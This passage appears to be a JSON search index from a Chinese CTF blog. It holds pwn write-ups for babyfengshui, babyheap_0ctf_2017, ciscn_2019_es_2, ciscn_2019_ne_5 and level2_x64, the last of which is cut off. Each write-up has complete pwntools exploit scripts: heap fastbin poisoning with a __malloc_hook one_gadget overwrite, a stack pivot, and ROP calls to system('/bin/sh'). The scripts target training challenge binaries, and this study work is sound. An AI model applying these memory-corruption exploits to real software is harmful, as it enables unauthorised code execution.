int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int, name: bytes, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;0\u0026#34;) sendline_after_clean(str(size)) sendline_after_clean(name) sendline_after_clean(str(len(content))) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) sendline_after_clean(str(index)) def show(index: int) -\u0026gt; bytes: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) p.recvuntil(b\u0026#34;name: \u0026#34;) received = {} received[\u0026#39;name\u0026#39;] = p.recvline() p.recvuntil(b\u0026#34;description: \u0026#34;) received[\u0026#39;description\u0026#39;] = p.recv(4) print(received) return received def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(len(content))) sendline_after_clean(content) allocate(0x80, \u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;) # 0 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 1 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 2 remove(0) # gdb.attach(p) # input() allocate(0x100, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 3 # allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 4 # gdb.attach(p) payload = flat([ b\u0026#34;a\u0026#34;*0x108, 0, 0x89, b\u0026#34;a\u0026#34;*0x80, 0, 0x89, m_elf.got[\u0026#39;free\u0026#39;] ]) change(3, payload) # gdb.attach(p) free_addr = ug(show(1)[\u0026#39;description\u0026#39;].ljust(4, b\u0026#34;\\x00\u0026#34;)) libc_base = free_addr - libc.sym[\u0026#39;free\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] suclog( free_addr=free_addr, libc_base=libc_base, system_addr=system_addr ) payload = flat(system_addr) change(1, payload) remove(2) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%BB%95%E8%BF%87%E5%A0%86%E6%BA%A2%E5%87%BA%E9%99%90%E5%88%B6buuctf-babyfengshui_33c3_2016/","section":"writeup","summary":"In times of change, learners inherit the earth, while the learned find themselves beautifully equipped to deal with a world that no longer exists. — Eric Hoffer 原题链接 查看程序架构 ida伪代码 可以看到是标准的菜单堆题 allocate 这里自定义了结构体 在ends处按d新建","tags":["pwn","绕过堆溢出限制"],"title":"【绕过堆溢出限制】BUUCTF babyfengshui_33c3_2016"},{"categories":["writeup"],"contents":" It is only when the mind and character slumber that the dress can be seen. — Ralph Waldo Emerson\n原题链接\n这一题是作者的第一道堆题，给作者的第一感受就是神乎其神，在参考了网络上的一些 WP 后写下自己的 WP，如有错误烦请斧正\n参考文章 checksec 查看程序架构 ida 查看程序伪代码 allocate fill Free dump 基本思路 构建 exp 针对四个选项编写四个输入函数 得到初始 chunk 安排指向 chunk 4 的指针 将chunk 4放进unsorted bin中获取libc基址 覆写任意地址的数据 完整exp 参考文章 0ctf2017 babyheap 【PWN系列】 Buuctf babyheap_0ctf_2017 Writeup babyheap_0ctf_2017 堆技巧 ctfwiki 堆概述 checksec 查看程序架构 $ checksec --file babyheap_0ctf_2017 [*] \u0026#39;/home/peterl/security/workspace/babyheap_0ctf_2017/babyheap_0ctf_2017\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ida 查看程序伪代码 这个程序故意把.symtab节删掉了，所以没有函数名称，这里作者在 ida 中简单地重命名了一下\nallocate 这个函数会分配一个大小小于 4096 的内存块（不存在符号位漏洞），而我们知道这个内存块会是从 top_chunk 中分割出来的：\n然后，malloc 会返回指向 chunk 中size 的尾部，user_data 的首部，同时也是 fd 指针的首部的指针，而这个指针会存放在一个大数组中，而这个大数组是以三个单元为一个实体的，可以看作它是一个结构体数组，这个结构体数组的构造如下：\nfill 这个函数在检查内存是否可用（标志是否为 1）后会向对应索引的内存中填入任意大小的数据，这个数据长度是由用户随意指定的！！这里就出现了堆溢出漏洞\nFree 在检查标志位是否为 1 后，它会将标识位、size 置零，并释放内存\ndump 这个函数在检查标志位是否为 1 后，会将内存中的内容打印出来\n基本思路 我们想一下这么一件事：在我们的结构体数组中，理论上每一个结构体内的内存地址是不一样的，而且如果内存被释放，标志位也会被置零，从而也就无法访问。\n那么问题来了，如果我们让两个结构体内的指针都指向同一块内存，那么就算这块内存已被释放，我们仍然可以通过另一个指针访问这块已被释放的空间\n同时，我们知道三件事：\n当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk（默认最大大小为(64 * SIZE_SZ / 4)，32 位为 64=0x40 字节，64 位为 128=0x80 字节） 如果 unsorted bin 内有且仅有一块 chunk 时，这块 chunk 的 fd 指针和 bk 指针都会指向main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 如果malloc_hook存在，malloc会先调用__malloc_hook的值指向的函数 那么，假设我们能获得一个指向 unsorted bin 中唯一 chunk 的指针，我们就能成功获得 libc 基址。\n而如果我们拥有了一个指向 fast bin 中 chunk 的指针，那么我们就能够更改其 fd 指针，从而控制 malloc 到的地址的值，从而我们能够修改任何地址的内容\n然后，我们就可以更改__malloc_hook的值，从而更改malloc的行为\n构建 exp 针对四个选项编写四个输入函数 def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] 得到初始 chunk 我们需要分配几个 chunk，其中有且仅有一个大小超过 fast bin 的限制，会被放进 unsorted bin 中\n然后我们会 allocate 两次，一次是正常的 fast bin 里面的内容，一次指向会被放入 unsorted bin 中的大 chunk。\n那么我们可以先划出 4 个 0x10 的 chunk（size 位=prev_size+size+prev_inuse+0x10=0x20），再划出一块 0x80 大小的 chunk 用以放进 unsorted bin 中：\n因此我们可以初始分配五个 chunk：\nallocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) 安排指向 chunk 4 的指针 我们只要覆写了 chunk 2 的 fd 指针，让它指向 chunk 4，那么我们在第二次 allocate 的时候，得到的就是指向 chunk 4 的指针\n具体步骤：\n这里我们先把 chunk 1 和 chunk 2 free 掉，这样子 chunk 1 和 chunk 2 的fd指针就生效了。\n又因为我们可以向一块chunk内填入任意大小的数据，我们就可以通过将payload1填进chunk0用以覆写chunk2的fd指针\n然后为了保证chunk4被正确分配，我们可以将payload2填入chunk3中，用以覆写chunk4的size\n这里要注意的是，chunk 4 的 size 位要设置成 0x21，不然在allocate(0x10)的时候，因为大小不一样，malloc 时是没有办法分配到 chunk 4 的\n然后我们就可以allocate两次，第二次分配到的就是chunk4了，这时chunk2指向的也是chunk4了。\n需要注意的是，我们需要将chunk 4 的size位恢复原状，因为我们下一步是要把chunk 4放入unsorted bin中\nfree(1) free(2) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) # 覆盖size位 payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) # 得到chunk4指针 allocate(0x10) # 恢复size位 payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) 将chunk 4放进unsorted bin中获取libc基址 我们不能直接把chunk 4 free掉，因为chunk 4和top chunk相邻，直接free掉会使chunk 4并入top chunk\n因此我们allocate一个chunk 5，然后free掉chunk 4，又因为此时chunk 4虽然由于标志位为0不可访问，但是chunk 2仍能被dump函数识别为未释放的空间，从而读取内容。\n因此，我们直接dump chunk 2，减去固定值0x3c4b78，就得到了libc基址\nallocate(0x80) free(4) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) 覆写任意地址的数据 当我们通过覆写chunk 2的fd位的时候，我们应该已经发现了，通过这种方式，我们可以将fd位覆写为任意我们喜欢的地址\n我们可以通过覆写code段中的__malloc_hook函数来改变malloc的行为，这个函数的详细说明见此，这里贴一段我们这个程序要用到的说明：\n可以看到，__malloc_hook函数的值是malloc会在它被call的时候使用的函数指针，所以，我们只需要更改__malloc_hook的值，我们就能更改malloc的行为\n__malloc_hook函数的偏移存在sym表中：\n$ readelf -aW libc-2.23.so | grep hook 00000000003c3dc8 000006fb00000006 R_X86_64_GLOB_DAT 00000000003c67b0 __malloc_initialize_hook@@GLIBC_2.2.5 + 0 00000000003c3ea8 000001e700000006 R_X86_64_GLOB_DAT 00000000003c9560 argp_program_version_hook@@GLIBC_2.2.5 + 0 00000000003c3eb0 0000072200000006 R_X86_64_GLOB_DAT 00000000003c67a0 __after_morecore_hook@@GLIBC_2.2.5 + 0 00000000003c3ee0 000008ae00000006 R_X86_64_GLOB_DAT 00000000003c4b00 __memalign_hook@@GLIBC_2.2.5 + 0 00000000003c3ef0 0000044000000006 R_X86_64_GLOB_DAT 00000000003c4b10 __malloc_hook@@GLIBC_2.2.5 + 0 00000000003c3ef8 000000d600000006 R_X86_64_GLOB_DAT 00000000003c67a8 __free_hook@@GLIBC_2.2.5 + 0 00000000003c3fd0 000005cb00000006 R_X86_64_GLOB_DAT 00000000003c4b08 __realloc_hook@@GLIBC_2.2.5 + 0 214: 00000000003c67a8 8 OBJECT WEAK DEFAULT 34 __free_hook@@GLIBC_2.2.5 487: 00000000003c9560 8 OBJECT GLOBAL DEFAULT 34 argp_program_version_hook@@GLIBC_2.2.5 958: 00000000003c92e0 8 OBJECT GLOBAL DEFAULT 34 _dl_open_hook@@GLIBC_PRIVATE 1088: 00000000003c4b10 8 OBJECT WEAK DEFAULT 33 __malloc_hook@@GLIBC_2.2.5 1483: 00000000003c4b08 8 OBJECT WEAK DEFAULT 33 __realloc_hook@@GLIBC_2.2.5 1787: 00000000003c67b0 8 OBJECT WEAK DEFAULT 34 __malloc_initialize_hook@@GLIBC_2.2.5 1826: 00000000003c67a0 8 OBJECT WEAK DEFAULT 34 __after_morecore_hook@@GLIBC_2.2.5 2222: 00000000003c4b00 8 OBJECT WEAK DEFAULT 33 __memalign_hook@@GLIBC_2.2.5 注意，因为默认输出宽度限制的原因，只用readelf -a命令无法输出__malloc_hook而是__m[\u0026hellip;]，必须加上-W或者--width选项才能加宽\n这里有一个小技巧，在__malloc_hook-0x23处malloc可以使size位刚好为0x7f，这样子就可以更改__malloc_hook的值\n我们再用one_gadget命令找一下可用的gadget：\n$ one_gadget libc-2.23.so 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4526a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL 因为有些gadget对栈有要求，所以只有一些可以用。试了一下，第二个刚好是可以用的\nallocate(0x60) free(4) # 更改fd指针 payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # 更改__malloc_hook的值 # prev_size+size=0x10，然后要填充0x13的空位才能到__malloc_hook的位置 payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) 然后allocate任意一个值就可以得到shell啦\n完整exp from pwn import * from pwn import p64, p32, u32, u64, p8 import sys from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyheap_0ctf_2017\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;25943\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x1329\u0026#34;) else: p = process([\u0026#34;ld-2.23.so\u0026#34;, fn], env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) # p = process(fn) libc = ELF(libc_name) def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) # gdb.attach(p) free(1) free(2) # gdb.attach(p) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) allocate(0x10) payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) allocate(0x80) free(4) # gdb.attach(p) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) allocate(0x60) free(4) # gdb.attach(p) payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # gdb.attach(p) payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) # gdb.attach(p) allocate(0x10) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E9%A6%96%E9%81%93%E5%A0%86%E9%A2%98fastbin-attackunsorted-bin-main_arena-leakbabyheap_0ctf_2017/","section":"writeup","summary":"It is only when the mind and character slumber that the dress can be seen. — Ralph Waldo Emerson 原题链接 这一题是作者的第一道堆题，给作者的第一感受就是神乎其神，在参考了网络上的一些 WP 后写下自己的 WP，如有错误","tags":["pwn","首道堆题","fastbin attack","unsorted bin main_arena leak"],"title":"【首道堆题】【fastbin attack】【unsorted bin main_arena leak】babyheap_0ctf_2017"},{"categories":["writeup"],"contents":" Self-trust is the first secret of success. — Ralph Waldo Emerson\n原题链接\n【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2 checksec查看程序架构 ida查看程序伪代码 构建exp 栈迁移的基本思路 泄露ebp 开始栈迁移 完整exp checksec查看程序架构 $ checksec --file ciscn_2019_es_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_es_2/ciscn_2019_es_2\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没啥特殊的，注意一下32位就可\nida查看程序伪代码 看起来像是栈溢出，但是read函数限制了读入的字节数，我们看一下栈：\n我们发现这时候到return的位置只能溢出一个字，如果这时候程序有一个backdoor函数那就万事大吉。\n我们可以找一下，发现了一个hack函数，但这个hack函数完全就是糊弄人的，从中唯一得到的有用信息是system确乎存在于plt表中，这样就不用ret2libc了：\n看一下源程序也没有格式化字符串漏洞，我们可以考虑栈迁移\n我们只要泄露出ebp，然后再通过第二次leave;ret就可以将esp更改到我们希望的地方\n构建exp 栈迁移的基本思路 我们知道，在call一个函数的时候，我们会先将下一条指令的地址进栈，再将当前的ebp进栈，然后将当前esp的值赋给ebp，这样就实现了备份下一条指令的地址、ebp原本的值、esp原本的值的作用\n然后等到函数结束时，程序会执行leave指令和ret指令。leave指令相当于mov esp, ebp; pop ebp，意思就是从备份中先恢复esp再恢复ebp；ret指令相当于pop eip，意思就是恢复备份的指令地址，这样就能执行函数调用的下一条语句了\n那么如果我们更改栈中备份的ebp数据的同时，在程序执行过一次leave; ret后再执行一遍，那么因为ebp的备份已被更改，所以ebp恢复的就是我们希望的数据，而再执行一遍leave; ret时，程序是假定ebp中保存的是esp的备份，那么通过这种方法，我们就可以成功地更改esp。\n这时我们已经让栈顶指针指向了我们希望的位置，这时由于leave指令，程序会将我们伪造的栈顶的第一个数据pop进ebp，然后由于ret指令再将第二个数据弹进eip中，那么我们就应该在伪造的栈的第二个数据放入system函数的地址\n然后我们就可以当普通的栈溢出构造栈了。\nsystem后面跟个0，再跟/bin/sh的地址就🆗了\n泄露ebp 我们看到源程序中：\nmemset(s, 0, 0x20u); read(0, s, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, s); 这个s字符数组被初始化为全\\0，此时如果我们将该数组所有的位都覆盖为垃圾数据，那么由于数组中没有\\0了，它就会把紧跟在s后面的数据一齐打印出来，直到遇到一个\\0为止。\n这里需要注意的是如果我们使用sendline函数，程序读入的字符最后会多一个\\n，所以这里发送payload应该用send。同时在payload中使用一个与前面不同的字符做哨兵：\npayload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; p.clean() p.send(payload) 也就是说我们只要满足：\n刚好输入0x28个数据 输入的最后一个字符与前面输入的不同 就可以了\n那么sendline函数也不是不可以用：\npayload = b\u0026#34;a\u0026#34;*0x27 p.clean() p.sendline(payload) 用\\n字符做哨兵就可以了。\n然后我们就可以recvebp地址了：\np.recvuntil(b\u0026#34;b\u0026#34;) ebp_addr = u32(p.recv(4)) # 我们可以讲礼貌一点，栈迁移完后返回地址和原来一样 eip_addr = u32(p.recv(4)) 开始栈迁移 我们用gdb调试一下，发现当恢复ebp备份值的时候，这个备份值比当时ebp的值刚好多0x10：\n那么我们的payload就出来了：\nleave_ret = 0x080484b8 # command也可以是cat flag command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) 完整exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./ciscn_2019_es_2\u0026#34; # libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485FD\u0026#34;) else: p = process(fn) m_elf = ELF(fn) p.clean() payload1 = b\u0026#34;a\u0026#34;*0x27 p.sendline(payload1) p.recvuntil(b\u0026#34;\\n\u0026#34;) ebp_addr = u32(p.recv(4)) eip_addr = u32(p.recv(4)) success(hex(ebp_addr)) p.clean() leave_ret = 0x080484b8 command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90ciscn_2019_es_2/","section":"writeup","summary":"Self-trust is the first secret of success. — Ralph Waldo Emerson 原题链接 【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2 checksec查看程序架构 ida查看程序伪代码 构建exp 栈迁移的基","tags":["pwn","栈迁移"],"title":"【栈迁移例题解析】ciscn_2019_es_2"},{"categories":["writeup"],"contents":" You may say I\u0026rsquo;m a dreamer, but I\u0026rsquo;m not the only one, I hope someday you will join us, and the world will live as one. — John Lennon\n原题链接\n【Write-up】BUUCTF ciscn_2019_ne_5 checksec查看程序架构 ida查看程序伪代码 构建exp checksec查看程序架构 $ checksec --file ciscn_2019_ne_5 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_ne_5/ciscn_2019_ne_5\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax int v4; // [esp+0h] [ebp-100h] BYREF char src[4]; // [esp+4h] [ebp-FCh] BYREF char v6[124]; // [esp+8h] [ebp-F8h] BYREF char s1[4]; // [esp+84h] [ebp-7Ch] BYREF char v8[96]; // [esp+88h] [ebp-78h] BYREF int *v9; // [esp+F4h] [ebp-Ch] v9 = \u0026amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(v8, 0, sizeof(v8)); *(_DWORD *)src = 48; memset(v6, 0, sizeof(v6)); puts(\u0026#34;Welcome to use LFS.\u0026#34;); printf(\u0026#34;Please input admin password:\u0026#34;); __isoc99_scanf(\u0026#34;%100s\u0026#34;, s1); if ( strcmp(s1, \u0026#34;administrator\u0026#34;) ) { puts(\u0026#34;Password Error!\u0026#34;); exit(0); } puts(\u0026#34;Welcome!\u0026#34;); puts(\u0026#34;Input your operation:\u0026#34;); puts(\u0026#34;1.Add a log.\u0026#34;); puts(\u0026#34;2.Display all logs.\u0026#34;); puts(\u0026#34;3.Print all logs.\u0026#34;); printf(\u0026#34;0.Exit\\n:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); switch ( v4 ) { case 0: exit(0); return result; case 1: AddLog(src); result = sub_804892B(argc, argv, envp); break; case 2: Display(src); result = sub_804892B(argc, argv, envp); break; case 3: Print(); result = sub_804892B(argc, argv, envp); break; case 4: GetFlag(src); result = sub_804892B(argc, argv, envp); break; default: result = sub_804892B(argc, argv, envp); break; } return result; } 首先我们找到了密码为administrator，然后我们看到下面的switch-case语句\n经过分析我们发现只有当case为1时能够输入128个字符：\n但是保存输入的变量不在当前栈中，而且在原本的main函数中传入的参数也只是一个保存地址的4字节变量，因此对原本的main函数也构成不了溢出。\n但是我们又发现，我们在src变量所指的内存中保存的数据会被别的函数利用：\n同时我们发现plt表中有system：\n$ readelf -r ciscn_2019_ne_5 重定位节 \u0026#39;.rel.dyn\u0026#39; at offset 0x3c4 contains 4 entries: 偏移量 信息 类型 符号值 符号名称 08049ff0 00000506 R_386_GLOB_DAT 00000000 stderr@GLIBC_2.0 08049ff4 00000906 R_386_GLOB_DAT 00000000 __gmon_start__ 08049ff8 00000c06 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 08049ffc 00000d06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 重定位节 \u0026#39;.rel.plt\u0026#39; at offset 0x3e4 contains 10 entries: 偏移量 信息 类型 符号值 符号名称 0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 strcmp@GLIBC_2.0 0804a014 00000307 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a018 00000407 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 strcpy@GLIBC_2.0 0804a020 00000707 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0804a024 00000807 R_386_JUMP_SLOT 00000000 system@GLIBC_2.0 0804a028 00000a07 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 0804a02c 00000b07 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a030 00000e07 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 在这题中Display函数没有用，但是如果题目的plt表中system函数就可以通过Display函数泄露基址来ret2libc。\n这里我们看到我们输入的数据在GetFlag函数中会被strcpy保存在它栈中的一个变量中，这样我们就可以间接地栈溢出了\n构建exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_ne_5\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;25151\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) m_elf = ELF(fn) bin_sh = 0x80482EA p.clean() p.sendline(b\u0026#34;administrator\u0026#34;) p.clean() p.sendline(b\u0026#34;1\u0026#34;) payload = b\u0026#34;a\u0026#34;*(0x48 + 0x4) + \\ pg(m_elf.plt[\u0026#39;system\u0026#39;]) \\ + pg(m_elf.plt[\u0026#39;exit\u0026#39;]) + pg(bin_sh) p.sendline(payload) p.clean() p.sendline(b\u0026#39;4\u0026#39;) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/ciscn_2019_ne_5/","section":"writeup","summary":"You may say I\u0026rsquo;m a dreamer, but I\u0026rsquo;m not the only one, I hope someday you will join us, and the world will live as one. — John Lennon 原题链接 【Write-up】BUUCTF ciscn_2019_ne_5 checksec查看程序架构 ida查看程序伪代码 构","tags":["pwn"],"title":"BUUCTF ciscn_2019_ne_5"},{"categories":["writeup"],"contents":" I believe that we are fundamentally the same and have the same basic potential. — Dalai Lama\n原题链接\n【Write-up】BUUCTF Jarvisoj_level2_x64 checksec 查看架构 ida 查看伪代码 构建 exp 完整 exp checksec 查看架构 $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 看来该程序是 64 位的，而且因为 NX 不能使用 shellcode\n同时，64 位系统调用 system 还要注意栈对齐的情况，要准备一个ret的 gadget\nida 查看伪代码 我们先运行一下康康：\n$ ./level2_x64 Input: Hello World! 看来有一个输入口，有机会栈溢出，我们用 ida 看看\n这个vulnerable_function属实是有点大摇大摆了\n点进去康康：\n这明摆着是要栈溢出然后调用 plt 表中的 system 函数\n构建 exp 寻找 system 函数地址：\n要注意的是，直接用readelf -r level2_x64命令读到的是.rela.plt 的符号表（涉及到延迟绑定机制，具体可以看这篇博文）\n寻找\u0026quot;\\bin\\sh\u0026quot;：\n$ ROPgadget --binary level2_x64 --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000600a90 : /bin/sh 还好有现成的，不用自己去构建了\n寻找两个 gadget：\n$ ROPgadget --binary level2_x64 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ 0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006b0 : pop r14 ; pop r15 ; ret 0x00000000004006b2 : pop r15 ; ret 0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret 0x0000000000400560 : pop rbp ; ret 0x00000000004006b3 : pop rdi ; ret 0x00000000004006b1 : pop rsi ; pop r15 ; ret 0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004004a1 : ret Unique gadgets found: 11 可以找到pop rdi;ret和ret：\n0x00000000004006b3 : pop rdi ; ret 0x00000000004004a1 : ret 然后我们就可以构建 exp 了\n注意，我们在一开始可以不加ret，试过一次如果出现 EOF 再加，如果加了还是报错就说明不是栈对齐的问题\n完整 exp from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./level2_x64\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, 